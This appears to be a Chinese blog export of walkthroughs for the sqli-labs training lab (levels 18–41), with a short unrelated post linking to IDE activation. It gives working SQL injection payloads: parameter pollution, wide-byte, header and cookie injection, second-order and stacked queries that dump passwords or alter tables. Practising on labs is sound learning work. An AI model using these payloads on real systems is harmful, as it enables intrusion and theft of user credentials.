<p><img src="http%E5%8F%82%E6%95%B0%E6%B1%A1%E6%9F%93.jpg"><br>可以参考<code>https://blog.csdn.net/nzjdsds/article/details/77758824</code></p>
<h3 id="30-参数污染"><a href="#30-参数污染" class="headerlink" title="30 参数污染"></a>30 参数污染</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>和上一关差不多 双引号闭合</p>
<p><code>?id=1&amp;id=-1&quot; union select 1,2,&quot;3</code></p>
<p><code>?id=12&amp;id=-1&quot; union select 1,(select password from users limit 0,1),&quot;3</code></p>
<h3 id="31-参数污染"><a href="#31-参数污染" class="headerlink" title="31 参数污染"></a>31 参数污染</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(<span class="subst">$id</span>) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<p><code>?id=12&amp;id=-1&quot;) union select 1,(select password from users limit 0,1),(&quot;3</code></p>
<br>

<h3 id="32-宽字节注入"><a href="#32-宽字节注入" class="headerlink" title="32 宽字节注入"></a>32 宽字节注入</h3><br>

<p><code>?id=1%df%27%20union%20select%201,2,3%20--+</code></p>
<p><code>?id=0%df%27%20union%20select%201,database(),3%20--+</code></p>
<p><code>?id=0%df%27%20union%20select%201,(select%20table_name%20from%20information_schema.tables%20where%20table_schema=database()%20limit%200,1),3%20--+</code></p>
<p>在查字段名的时候需要把<code>&#39;users&#39;</code>转成16进制，16进制的表名不需要引号 <code>0x7573657273</code></p>
<p><code>?id=0%df%27%20union%20select%201,(select%20column_name%20from%20information_schema.columns%20where%20table_schema=database()%20and%20table_name=0x7573657273%20limit%200,1),3%20--+</code></p>
<br>

<h3 id="33-宽字节注入"><a href="#33-宽字节注入" class="headerlink" title="33 宽字节注入"></a>33 宽字节注入</h3><p>和32一模一样</p>
<p><code>?id=1%df%27%20and%201=1%20--+</code></p>
<br>

<h3 id="34-宽字节注入-POST"><a href="#34-宽字节注入-POST" class="headerlink" title="34 宽字节注入(POST)"></a>34 宽字节注入(POST)</h3><p>过滤方式和上面的一样，可以使用burp直接传，不过POST传入数据时会进行url编码，</p>
<p>在输入 <code>1%df or 1=1#</code>后抓包可以看到前面的<code>%df</code>变成了<code>%25df</code></p>
<p><code>uname=1%25df%27+or+1%3D1%23&amp;passwd=aa&amp;submit=Submit</code>修改一下即可</p>
<br>

<br>

<h3 id="35-宽字节注入"><a href="#35-宽字节注入" class="headerlink" title="35 宽字节注入"></a>35 宽字节注入</h3><p>和32差不多 只不过这里是字符型，不需要<code>&#39;</code>闭合</p>
<p><code>?id=0 union select 1,database(),3</code></p>
<br>

<br>

<h3 id="36-宽字节注入"><a href="#36-宽字节注入" class="headerlink" title="36 宽字节注入"></a>36 宽字节注入</h3><p>和前面一样</p>
<p><code>?id=0%df%27%20union%20select%201,2,3--+</code></p>
<p>?id=0%df%27%20and%20updatexml(1,concat(0x7e,(select%20database()),0x7e),1)–+</p>
<br>

<h3 id="37-宽字节注入-POST"><a href="#37-宽字节注入-POST" class="headerlink" title="37 宽字节注入(POST)"></a>37 宽字节注入(POST)</h3><p>和34一样</p>
<br>

<h3 id="38-堆叠注入"><a href="#38-堆叠注入" class="headerlink" title="38 堆叠注入"></a>38 堆叠注入</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="comment">/* execute multi query */</span></span><br><span class="line"><span class="keyword">if</span> (mysqli_multi_query(<span class="variable">$con1</span>, <span class="variable">$sql</span>))</span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">/* store first result set */</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$result</span> = mysqli_store_result(<span class="variable">$con1</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$row</span> = mysqli_fetch_row(<span class="variable">$result</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;font size = &quot;5&quot; color= &quot;#00FF00&quot;&gt;&#x27;</span>;	</span><br><span class="line">            printf(<span class="string">&quot;Your Username is : %s&quot;</span>, <span class="variable">$row</span>[<span class="number">1</span>]);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            printf(<span class="string">&quot;Your Password is : %s&quot;</span>, <span class="variable">$row</span>[<span class="number">2</span>]);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//            mysqli_free_result($result);</span></span><br><span class="line">    &#125;</span><br><span class="line">        <span class="comment">/* print divider */</span></span><br><span class="line">    <span class="keyword">if</span> (mysqli_more_results(<span class="variable">$con1</span>))</span><br><span class="line">    &#123;</span><br><span class="line">            <span class="comment">//printf(&quot;-----------------\n&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line">     <span class="comment">//while (mysqli_next_result($con1));</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">    &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">	print_r(mysqli_error(<span class="variable">$con1</span>));</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">/* close connection */</span></span><br><span class="line">mysqli_close(<span class="variable">$con1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>mysqli_multi_query()</code>堆叠注入，多个查询用<code>;</code>分隔</p>
<p>参考<code>https://www.cnblogs.com/lcamry/p/5762905.html</code></p>
<p><code>?id=1&#39;;create table test like users --+</code></p>
<p>发现数据库中新建了名的<code>test</code>的表</p>
<p><code>?id=1&#39;;drop table test; --+</code>删除<code>test</code>表</p>
<p>在<code>uers</code>表添加数据</p>
<p><code>?id=1&#39;;insert into users(id,username,password) values(&#39;25&#39;,&#39;Mamor&#39;,&#39;Mamor&#39;)--+</code></p>
<br>

<h3 id="39-堆叠注入"><a href="#39-堆叠注入" class="headerlink" title="39 堆叠注入"></a>39 堆叠注入</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=<span class="subst">$id</span> LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>数字型 不需要闭合</p>
<p><code>?id=1;insert into users(id,username,password) values(&#39;26&#39;,&#39;Mamor&#39;,&#39;Mamor&#39;) --+</code></p>
<br>

<h3 id="40-堆叠注入"><a href="#40-堆叠注入" class="headerlink" title="40 堆叠注入"></a>40 堆叠注入</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(&#x27;<span class="subst">$id</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>

<p><code>?id=1&#39;) ; insert into users(id,username,password) values(&#39;40&#39;,&#39;Mamor&#39;,&#39;Mamor&#39;)--+</code></p>
<br>

<h3 id="41-堆叠注入"><a href="#41-堆叠注入" class="headerlink" title="41 堆叠注入"></a>41 堆叠注入</h3><p><code>?id=2-1 --+</code>和<code>?id=1 --+</code>返回结果一样</p>
<p>可以判断是数字型，和39一样</p>
<p><code>?id=1 ; insert into users(id,username,password) values(&#39;40&#39;,&#39;Mamor&#39;,&#39;Mamor&#39;)--+</code></p>
]]></content>
      <categories>
        <category>SQLi</category>
      </categories>
      <tags>
        <tag>SQLi</tag>
      </tags>
  </entry>
  <entry>
    <title>idea激活</title>
    <url>/posts/b49b0221/</url>
    <content><![CDATA[<p><a href="https://shimo.im/docs/jRRw9RR3hhxPHpKg/read">https://shimo.im/docs/jRRw9RR3hhxPHpKg/read</a></p>
]]></content>
      <categories>
        <category>IDEA</category>
      </categories>
      <tags>
        <tag>IDEA</tag>
      </tags>
  </entry>
  <entry>
    <title>sqli-labs2</title>
    <url>/posts/63ba4580/</url>
    <content><![CDATA[<h3 id="18-UA注入"><a href="#18-UA注入" class="headerlink" title="18 UA注入"></a>18 UA注入</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span> php</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$value</span>))</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="variable">$value</span> = substr(<span class="variable">$value</span>,<span class="number">0</span>,<span class="number">20</span>); <span class="comment">// truncation (see comments)</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (get_magic_quotes_gpc())  <span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">            &#123;</span><br><span class="line">            <span class="variable">$value</span> = stripslashes(<span class="variable">$value</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">if</span> (!ctype_digit(<span class="variable">$value</span>))       <span class="comment">// Quote if not a number</span></span><br><span class="line">            &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="string">&quot;&#x27;&quot;</span> . mysql_real_escape_string(<span class="variable">$value</span>) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">        <span class="variable">$value</span> = intval(<span class="variable">$value</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<p><code>check_input()</code>函数先截取前20位，</p>
<p>如果开启GPC,去掉反斜杠，</p>
<p>如果是十进制，有非法字符再转译掉</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;;</span><br><span class="line">  $result1 <span class="operator">=</span> mysql_query($<span class="keyword">sql</span>);</span><br><span class="line">  $row1 <span class="operator">=</span> mysql_fetch_array($result1);</span><br><span class="line">      if($row1)</span><br><span class="line">          &#123;</span><br><span class="line">          echo <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;</span>;</span><br><span class="line">          $<span class="keyword">insert</span><span class="operator">=</span>&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;, $uname)&quot;;</span><br><span class="line">          mysql_query($<span class="keyword">insert</span>);</span><br><span class="line">          <span class="operator">/</span><span class="operator">/</span>echo <span class="string">&#x27;Your IP ADDRESS is: &#x27;</span> .$IP;</span><br><span class="line">          echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">          <span class="operator">/</span><span class="operator">/</span>echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">          echo <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;&#x27;</span>;            </span><br><span class="line">          echo <span class="string">&#x27;Your User Agent is: &#x27;</span> .$uagent;</span><br><span class="line">          echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">          echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">          print_r(mysql_error());            </span><br><span class="line">          echo &quot;&lt;br&gt;&lt;br&gt;&quot;;</span><br><span class="line">          echo <span class="string">&#x27;&lt;img src=&quot;../images/flag.jpg&quot;  /&gt;&#x27;</span>;</span><br><span class="line">          echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">          </span><br><span class="line">          &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">          echo <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;</span>;</span><br><span class="line">          <span class="operator">/</span><span class="operator">/</span>echo &quot;Try again looser&quot;;</span><br><span class="line">          print_r(mysql_error());</span><br><span class="line">          ... ... </span><br></pre></td></tr></table></figure>

<p>这里对<code>username</code>和<code>password</code>做了处理，但没有对<code>UA</code>处理 这里使用UA·</p>
<p>burp suite抓包改UA <code>1&#39; or updatexml(1,concat(0x7e,(database()),0x7e),0) or &#39;</code></p>
<h3 id="19-Referer注入"><a href="#19-Referer注入" class="headerlink" title="19 Referer注入"></a>19 Referer注入</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$uname <span class="operator">=</span> check_input($_POST[<span class="string">&#x27;uname&#x27;</span>]);</span><br><span class="line">  $passwd <span class="operator">=</span> check_input($_POST[<span class="string">&#x27;passwd&#x27;</span>]);</span><br><span class="line">  ... ...</span><br><span class="line"></span><br><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;;</span><br><span class="line">  $result1 <span class="operator">=</span> mysql_query($<span class="keyword">sql</span>);</span><br><span class="line">  $row1 <span class="operator">=</span> mysql_fetch_array($result1);</span><br><span class="line">      if($row1)</span><br><span class="line">          &#123;</span><br><span class="line">          echo <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;</span>;</span><br><span class="line">          $<span class="keyword">insert</span><span class="operator">=</span>&quot;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;)&quot;;</span><br><span class="line">          mysql_query($<span class="keyword">insert</span>);</span><br><span class="line">          <span class="operator">/</span><span class="operator">/</span>echo <span class="string">&#x27;Your IP ADDRESS is: &#x27;</span> .$IP;</span><br><span class="line">          echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">          <span class="operator">/</span><span class="operator">/</span>echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">          echo <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;&#x27;</span>;            </span><br><span class="line">          echo <span class="string">&#x27;Your Referer is: &#x27;</span> .$uagent;</span><br></pre></td></tr></table></figure>

<p>改Referer <code>1&#39; or updatexml(1,concat(0x7e,(database()),0x7e),0) or &#39;</code></p>
<h3 id="20-Cookie注入"><a href="#20-Cookie注入" class="headerlink" title="20 Cookie注入"></a>20 Cookie注入</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">$uname <span class="operator">=</span> check_input($_POST[<span class="string">&#x27;uname&#x27;</span>]);</span><br><span class="line">    $passwd <span class="operator">=</span> check_input($_POST[<span class="string">&#x27;passwd&#x27;</span>]);</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    $<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT  users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1&quot;;</span><br><span class="line">    $result1 <span class="operator">=</span> mysql_query($<span class="keyword">sql</span>);</span><br><span class="line">    $row1 <span class="operator">=</span> mysql_fetch_array($result1);</span><br><span class="line">    $cookee <span class="operator">=</span> $row1[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        if($row1)</span><br><span class="line">            &#123;</span><br><span class="line">            echo <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;</span>;</span><br><span class="line">            setcookie(<span class="string">&#x27;uname&#x27;</span>, $cookee, <span class="type">time</span>()<span class="operator">+</span><span class="number">3600</span>);    </span><br><span class="line">            header (<span class="string">&#x27;Location: index.php&#x27;</span>);</span><br><span class="line">            echo &quot;I LOVE YOU COOKIES&quot;;</span><br><span class="line">            echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">            echo <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;&#x27;</span>;            </span><br><span class="line">            <span class="operator">/</span><span class="operator">/</span>echo <span class="string">&#x27;Your Cookie is: &#x27;</span> .$cookee;</span><br><span class="line">            echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">            print_r(mysql_error());            </span><br><span class="line">            echo &quot;&lt;br&gt;&lt;br&gt;&quot;;</span><br><span class="line">            echo <span class="string">&#x27;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&#x27;</span>;</span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">            echo <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;</span>;</span><br><span class="line">            <span class="operator">/</span><span class="operator">/</span>echo &quot;Try again looser&quot;;</span><br><span class="line">            print_r(mysql_error());</span><br></pre></td></tr></table></figure>

<p>改Cookie </p>
<p><code>uname=1.9&#39; and 1=1 union select 1,2,table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1  #</code>或者</p>
<p><code>uname=1&#39; and updatexml(1,concat(0x7e,(select * from ( select concat(username,password) from users limit 0,1)a),0x7e),1)#</code></p>
<br>

<br>

<h3 id="21"><a href="#21" class="headerlink" title="21"></a>21</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">if(<span class="operator">!</span>isset($_POST[<span class="string">&#x27;submit&#x27;</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        $cookee <span class="operator">=</span> $_COOKIE[<span class="string">&#x27;uname&#x27;</span>];</span><br><span class="line">        $format <span class="operator">=</span> <span class="string">&#x27;D d M Y - H:i:s&#x27;</span>;</span><br><span class="line">        $<span class="type">timestamp</span> <span class="operator">=</span> <span class="type">time</span>() <span class="operator">+</span> <span class="number">3600</span>;</span><br><span class="line">        ... ...</span><br><span class="line"></span><br><span class="line">        $cookee <span class="operator">=</span> base64_decode($cookee);</span><br><span class="line">        $<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE username=(&#x27;$cookee&#x27;) LIMIT 0,1&quot;;</span><br><span class="line">        </span><br><span class="line">        ... ...</span><br></pre></td></tr></table></figure>

<p>和20关相比，多了base64编码 ，这个使用<code>&#39;)</code>闭合</p>
<p><code>uname=1&#39;) and updatexml(1,concat(0x7e,(select * from ( select concat_ws(&#39;:&#39;,username,password) from users limit 0,1)a),0x7e),1)#</code> base64一下</p>
<p><code>MScpIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSwoc2VsZWN0ICogZnJvbSAoIHNlbGVjdCBjb25jYXRfd3MoJzonLHVzZXJuYW1lLHBhc3N3b3JkKSBmcm9tIHVzZXJzIGxpbWl0IDAsMSlhKSwweDdlKSwxKSM=</code></p>
<h3 id="22"><a href="#22" class="headerlink" title="22"></a>22</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">if(<span class="operator">!</span>isset($_POST[<span class="string">&#x27;submit&#x27;</span>]))</span><br><span class="line">        &#123;</span><br><span class="line">            $cookee <span class="operator">=</span> $_COOKIE[<span class="string">&#x27;uname&#x27;</span>];</span><br><span class="line">            ... ... </span><br><span class="line">            $cookee <span class="operator">=</span> base64_decode($cookee);</span><br><span class="line">            $cookee1 <span class="operator">=</span> <span class="string">&#x27;&quot;&#x27;</span>. $cookee. <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">            $<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE username=$cookee1 LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>

<p><code>&quot;</code>闭合，其余和21相同</p>
<br>

<h3 id="23-被过滤-单引号闭合-报错注入"><a href="#23-被过滤-单引号闭合-报错注入" class="headerlink" title="23 #```-- 被过滤 单引号闭合 报错注入"></a>23 <code>#```-- </code>被过滤 单引号闭合 报错注入</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>#</code>和<code>-- </code>被过滤了 使用<code>&#39;</code>闭合</p>
<p><code>?id=1&#39; and &#39;1&#39;=&#39;1</code></p>
<p><code>?id=1&#39;%20 order by 5 and &#39;1&#39;=&#39;1</code>无法通过这种方式判断字段数</p>
<p><code>?id=-1&#39; union select 1,2 and &#39;1&#39;=&#39;1</code>报错</p>
<p><code>?id=-1&#39; union select 1,2,3 and &#39;1&#39;=&#39;1</code>不报错</p>
<p><code>?id=-1&#39; union select 1,2,3 and &#39;1&#39;=&#39;1</code>报错</p>
<p>可以判断有三个字段，2，3是回显点，但是3处输出结果只有0和1，估计是布尔型，所以把2当作输出点</p>
<p>当然这里亦可以使用报错注入，相对简单点</p>
<p><code>?id=-1&#39; and updatexml(1,concat(0x7e,database(),0x7e),1) and &#39;1&#39;=&#39;1</code></p>
<br>

<br>

<h3 id="24-二次注入"><a href="#24-二次注入" class="headerlink" title="24 二次注入"></a>24 二次注入</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># pass_change.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;../sql-connections/sql-connect.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Validating the user input........</span></span><br><span class="line">    <span class="variable">$username</span>= <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line">    <span class="variable">$curr_pass</span>= mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;current_password&#x27;</span>]);</span><br><span class="line">    <span class="variable">$pass</span>= mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">    <span class="variable">$re_pass</span>= mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">&#x27;re_password&#x27;</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$pass</span>==<span class="variable">$re_pass</span>)</span><br><span class="line">    &#123;    </span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="subst">$pass</span>&#x27; where username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$curr_pass</span>&#x27; &quot;</span>;</span><br><span class="line">        <span class="variable">$res</span> = mysql_query(<span class="variable">$sql</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;You tried to be smart, Try harder!!!! :( &#x27;</span>);</span><br><span class="line">        <span class="variable">$row</span> = mysql_affected_rows();</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$row</span>==<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;Password successfully updated&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            header(<span class="string">&#x27;Location: failed.php&#x27;</span>);</span><br><span class="line">            <span class="comment">//echo &#x27;You tried to be smart, Try harder!!!! :( &#x27;;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;font size=&quot;5&quot; color=&quot;#FFFF00&quot;&gt;&lt;center&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Make sure New Password and Retype Password fields have same value&quot;</span>;</span><br><span class="line">        header(<span class="string">&#x27;refresh:2, url=index.php&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit1&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    session_destroy();</span><br><span class="line">    setcookie(<span class="string">&#x27;Auth&#x27;</span>, <span class="number">1</span> , time()<span class="number">-3600</span>);</span><br><span class="line">    header (<span class="string">&#x27;Location: index.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>在<code>update</code>在修改密码时，<code>$username</code>直接获取session 并没有做任何过滤处理</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#login.php</span></span><br><span class="line"><span class="meta">&lt;?</span> php</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sqllogin</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="variable">$username</span> = mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">&quot;login_user&quot;</span>]);</span><br><span class="line">   <span class="variable">$password</span> = mysql_real_escape_string(<span class="variable">$_POST</span>[<span class="string">&quot;login_password&quot;</span>]);</span><br><span class="line">   <span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$password</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="comment">//$sql = &quot;SELECT COUNT(*) FROM users WHERE username=&#x27;$username&#x27; and password=&#x27;$password&#x27;&quot;;</span></span><br><span class="line">   <span class="variable">$res</span> = mysql_query(<span class="variable">$sql</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&#x27;You tried to be real smart, Try harder!!!! :( &#x27;</span>);</span><br><span class="line">   <span class="variable">$row</span> = mysql_fetch_row(<span class="variable">$res</span>);</span><br><span class="line">    <span class="comment">//print_r($row) ;</span></span><br><span class="line">   <span class="keyword">if</span> (<span class="variable">$row</span>[<span class="number">1</span>]) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$row</span>[<span class="number">1</span>];</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">              <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$login</span> = sqllogin();</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$login</span>== <span class="number">0</span>) </span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>] = <span class="variable">$login</span>;</span><br><span class="line">    setcookie(<span class="string">&quot;Auth&quot;</span>, <span class="number">1</span>, time()+<span class="number">3600</span>);  <span class="comment">/* expire in 15 Minutes */</span></span><br><span class="line">    header(<span class="string">&#x27;Location: logged-in.php&#x27;</span>);</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123; ... ...</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>当成功登录时，<code>$_SESSION[&quot;username&quot;]</code>直接取出使用，并没有过滤，所以这里的<code>$username</code>是可控变量</p>
<br>

<br>

<p>先注册一个<code>admin&#39;# </code>账号 随便设置一个密码<code>123456</code>，登录后修改密码为<code>12345</code></p>
<p>使用<code>admin</code> 再次登录发现原密码<code>admin</code>被改成<code>12345</code></p>
<br>

<h3 id="25-or-and被过滤"><a href="#25-or-and被过滤" class="headerlink" title="25 or and被过滤"></a>25 <code>or</code> <code>and</code>被过滤</h3><figure class="highlight"><table><tr><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> blacklist($id)</span><br><span class="line">&#123;</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/or/i&#x27;</span>,&quot;&quot;, $id);			<span class="operator">/</span><span class="operator">/</span>strip <span class="keyword">out</span> <span class="keyword">OR</span> (non <span class="keyword">case</span> <span class="keyword">sensitive</span>)</span><br><span class="line">	$id<span class="operator">=</span> preg_replace(<span class="string">&#x27;/AND/i&#x27;</span>,&quot;&quot;, $id);		<span class="operator">/</span><span class="operator">/</span>Strip <span class="keyword">out</span> <span class="keyword">AND</span> (non <span class="keyword">case</span> <span class="keyword">sensitive</span>)</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> $id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

